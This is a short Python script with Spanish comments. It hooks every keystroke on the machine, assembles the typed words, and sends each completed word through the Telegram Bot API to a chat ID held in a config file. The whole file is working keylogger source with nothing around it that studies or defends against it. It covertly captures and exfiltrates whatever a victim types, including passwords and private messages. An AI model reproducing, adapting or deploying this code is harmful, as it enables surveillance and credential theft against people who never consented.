

import time
import keyboard
import requests

from config import *

# Palabra que se va a enviar al bot a modo de mensaje
palabra = ""


"""=============================== PRIMERA PARTE : LA LOGICA DEL ARMADO DE LA PALABRA ================================================="""



# Funcion que se encarga de armar las palabras
def evento_teclado(event):
    global palabra
    if event.event_type == "down" and len(event.name) == 1 and event.name.isprintable():
        #print(f"Tecla presionada: {event.name}")
        palabra += event.name
    if event.event_type == "down" and event.name == "space":
        print(palabra)
        enviar_palabra(palabra) # Función definida en la segunda parte del script
        time.sleep(1) # Retardo de un segundo así no se resetea la palabra hasta enviar la palabra
        palabra = ""

# Engancha todas las teclas y llama a evento_teclado cuando se presiona una tecla
keyboard.hook(evento_teclado)



"""============================ SEGUNDA PARTE : LA LOGICA DEL ENVIO DE LA PALABRA A LA API DE TELEGRAM =================================="""



# Funcion para enviar la palabra al bot de telegram
def enviar_palabra(palabra):

    # Reemplaza con tu token de bot de Telegram
    bot_token = TOKEN        

    # Reemplaza con el chat_id del usuario o grupo al que deseas enviar el mensaje
    chat_id = CHAT_ID

    # URL de la API de Telegram
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Parámetros de la solicitud
    params = {
        'chat_id': chat_id,
        'text': palabra
    }

    # Enviar la solicitud POST a la API de Telegram
    response = requests.post(url, params=params)

    # Verificar si la solicitud fue exitosa
    if response.status_code == 200:
        print("Mensaje enviado correctamente.")
    else:
        print("Error al enviar el mensaje:", response.text)


"""================================================================================================================================="""


# El teclado queda a la escucha hasta que se apreta escape o se termina el script con ctrl + c
try:
    keyboard.wait("esc")
    
except KeyboardInterrupt:
    print("se ha detenido el script")



"""=================================================== ... fin ... =================================================================="""        
